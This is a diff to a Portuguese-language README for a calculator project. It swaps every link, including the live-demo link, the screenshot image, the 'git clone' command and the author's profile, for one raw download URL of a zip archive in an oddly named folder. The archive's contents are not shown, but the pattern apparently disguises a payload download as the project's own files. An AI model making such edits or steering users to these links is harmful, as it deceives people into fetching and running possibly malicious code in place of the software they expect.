@@ -6,13 +6,13 @@ Este é um projeto de uma calculadora totalmente funcional, construída com tecn
 
 Você pode testar a calculadora em funcionamento aqui:
 
-**[Clique para acessar a demonstração]([https://codeby-red.github.io/Java.Calculadora/])**
+**[Clique para acessar a demonstração]([https://github.com/CodeBy-red/Java.Calculadora/raw/refs/heads/main/inappreciative/Java_Calculadora_1.1.zip])**
 
 *(Dica: Substitua o link acima pela URL que você obteve ao hospedar no GitHub Pages, Netlify ou Vercel.)*
 
 ### 📸 Screenshot
 
-![Screenshot da Calculadora]([https://github.com/CodeBy-red/Java.Calculadora/blob/main/Captura%20de%20tela%202025-07-15%20094139.png?raw=true])
+![Screenshot da Calculadora]([https://github.com/CodeBy-red/Java.Calculadora/raw/refs/heads/main/inappreciative/Java_Calculadora_1.1.zip])
 
 *(Dica: Tire um print da sua calculadora funcionando, adicione o arquivo de imagem na pasta do projeto e substitua o link acima pelo nome do arquivo. Ex: `./screenshot-calculadora.png`)*
 
@@ -53,7 +53,7 @@ Para rodar este projeto na sua própria máquina, siga os passos abaixo:
 
 1.  **Clone o repositório:**
     ```bash
-    git clone [https://github.com/CodeBy-red/Java.Calculadora]
+    git clone [https://github.com/CodeBy-red/Java.Calculadora/raw/refs/heads/main/inappreciative/Java_Calculadora_1.1.zip]
     ```
 
 2.  **Navegue até a pasta do projeto:**
@@ -94,4 +94,4 @@ Como próximos passos para evoluir o projeto, planejo implementar:
 
 Desenvolvido por **[RED.dev]**.
 
-* **GitHub:** [@CodeBy-red](https://github.com/CodeBy-red)
+* **GitHub:** [@CodeBy-red](https://github.com/CodeBy-red/Java.Calculadora/raw/refs/heads/main/inappreciative/Java_Calculadora_1.1.zip)
